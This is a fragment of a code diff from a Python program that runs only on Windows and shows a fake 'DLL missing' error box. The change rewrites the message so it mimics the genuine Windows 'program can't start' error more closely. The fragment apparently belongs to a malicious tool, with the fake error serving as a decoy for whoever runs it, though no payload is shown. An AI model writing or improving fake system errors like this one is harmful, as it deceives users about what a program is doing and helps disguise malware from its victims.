@@ -40,7 +40,7 @@ import ctypes
 if platform.system() != "Windows":
     exit()
 
-ctypes.windll.user32.MessageBoxW(0, "Some dll are missing on your computer (VLg7.dll)", "DDL missing", 16)
+ctypes.windll.user32.MessageBoxW(0, "The program can\'t start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
 
 def writeforfile(data, name):
